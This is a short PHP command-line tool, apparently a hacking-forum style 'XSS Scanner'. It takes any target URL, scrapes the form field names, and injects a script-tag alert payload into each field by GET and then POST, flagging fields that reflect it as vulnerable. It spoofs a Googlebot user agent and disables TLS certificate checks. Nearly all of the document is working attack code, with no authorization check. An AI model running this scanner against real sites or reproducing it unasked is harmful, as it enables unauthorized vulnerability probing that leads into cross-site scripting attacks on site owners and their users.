<?php
# PHP XSS Scanner 
 
echo"
____  ___  _________ _________   __________________     _____    _______   
\   \/  / /   _____//   _____/  /   _____/\_   ___ \   /  _  \   \      \  
 \     /  \_____  \ \_____  \   \_____  \ /    \  \/  /  /_\  \  /   |   \ 
 /     \  /        \/        \  /        \\     \____/    |    \/    |    \
/___/\  \/_______  /_______  / /_______  / \______  /\____|__  /\____|__  /
      \_/        \/        \/          \/         \/         \/         \/ 
";
 
echo 'URL TARGET? # ';
$x=trim(fgets(STDIN,1024));
 
$ch=curl_init();
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_URL,$x);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
curl_setopt($ch,CURLOPT_TIMEOUT,30);
$data=curl_exec($ch);
preg_match_all("#name='(.*?)'#i",$data,$matches);
$forms=array_unique($matches[1]);
foreach($forms as $form){
    $resultat=scan($x,$form);
    if($resultat == true){
        echo"\r\n$x : $form >\tVULN!\r\n";
    }else{
        echo"\r\n$x : $form >\tNOT VULN!\r\n";
    }
}
 
function scan($x,$form){
    $payload='<IMG """><SCRIPT>alert("miral")</SCRIPT>">';
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_URL,$x."?$form=".urlencode($payload));
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
    curl_setopt($ch,CURLOPT_TIMEOUT,30);
    $data=curl_exec($ch);
    if(preg_match('/miral/',$data)){
        echo"\r\n[!] Method GET";
        return true;
    }else{
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_URL,$x);
        curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_POSTFIELDS,"$form=".urlencode($payload));
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
        curl_setopt($ch,CURLOPT_TIMEOUT,30);
        $data=curl_exec($ch);
        if(preg_match('/miral/',$data)){
            echo"\r\n[!] Method POST";
            return true;
        }else{
            return false;
        }
    }
}